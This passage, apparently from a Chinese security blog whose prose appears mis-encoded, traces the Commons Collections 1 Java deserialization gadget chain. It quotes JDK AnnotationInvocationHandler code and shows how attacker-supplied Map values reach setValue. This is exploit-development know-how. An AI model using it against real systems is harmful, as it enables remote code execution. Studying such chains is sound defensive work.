&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;defaultReadObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// Check to make sure that types have not evolved incompatibly
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;AnnotationType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;annotationType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;annotationType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IllegalArgumentException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// Class is no longer an annotation type; time to punch out
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;InvalidObjectException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Non-annotation type in annotation serial stream&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberTypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;annotationType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;memberTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// If there are annotation members without values, that
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// situation is handled by the invoke method.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memberType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// i.e. member still exists
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memberType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                      &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExceptionProxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationTypeMismatchExceptionProxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;[&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;]&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setMember&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;n&#34;&gt;annotationType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;members&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬é‡ç‚¹çœ‹ä¸‹é¢è¿™ä¸¤å¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Map.Entry&amp;lt;String, Object&amp;gt; memberValue : memberValues.entrySet()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;memberValue.setValue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢è¿™äº›è¿‡ç¨‹çœ‹ä¸æ‡‚ä¸è¦ç´§ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼ŒæŠŠæ•´ä¸ªæ€è·¯å¼„é¡ºäº†å…ˆã€‚æˆ‘ä»¬çŸ¥é“æ‰§è¡Œååºåˆ—åŒ–åè¿™é‡Œä¼šæŠŠMapè¿›è¡Œéå†ï¼Œç„¶åå»æ‰§è¡Œèµ‹å€¼ç»™&lt;code&gt;memberValue&lt;/code&gt;çš„setValueæ–¹æ³•ã€‚é‚£æœ‰äººåœ¨è¿™é‡Œå°±è¿·æƒ‘äº†ï¼Œ&lt;code&gt;memberValue&lt;/code&gt;åˆæ˜¯æ€ä¹ˆæ¥çš„ï¼Œæˆ‘ä»¬è¿™ä¸ªå˜é‡æ˜¯åœ¨åˆ›å»ºAnnotationInvocationHandlerå¯¹è±¡çš„æ—¶å€™ä¼ è¿›æ¥çš„å€¼ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ³¨è§£ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯Mapï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠæˆ‘ä»¬çš„æ¶æ„ä»£ç ä½œä¸ºMapç±»å‹ä¼ ç»™AnnotationInvocationHandlerå¯¹è±¡æ‰èƒ½å®ç°ååºåˆ—åŒ–ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;AnnotationInvocationHandler&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Serializable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;6182022883658399397L&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&amp;gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;superInterfaces&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isAnnotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;superInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;superInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationFormatError&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Attempt to create proxy for a non-annotation type.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;memberValues&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸‹æ¥å°±è¦å»æ‰¾åˆ©ç”¨åˆ°setValueæ–¹æ³•çš„ç±»ï¼Œå› ä¸ºåœ¨è¿™é‡Œè§¦å‘è¿™ä¸ªæ–¹æ³•&lt;code&gt;memberValue.setValue&lt;/code&gt;ï¼Œæˆ‘ä»¬åªè¦ä»ccåº“ä¸­æ‰¾åˆ°åˆ©ç”¨è¯¥æ–¹æ³•çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å³é”®å¯»æ‰¾&lt;code&gt;find usages&lt;/code&gt;ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ˜¯mapç±»å‹çš„ç±»ï¼Œä¸ºä»€ä¹ˆè¦æ‰¾mapç±»å‹å‘¢ï¼Œå› ä¸ºmapç±»å‹çš„ç”¨å¾—æ¯”è¾ƒå¤šï¼Œä¹Ÿæ¯”è¾ƒå¹¿æ³›ï¼Œæˆ‘ä»¬çœ‹åˆ°&lt;code&gt;AbstractInputCheckedMapDecorator&lt;/code&gt;ç±»ä½¿ç”¨äº†è¯¥æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æŸ¥çœ‹ä¸‹&lt;code&gt;checkSetValue&lt;/code&gt;çš„å®šä¹‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AbstractMapDecorator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
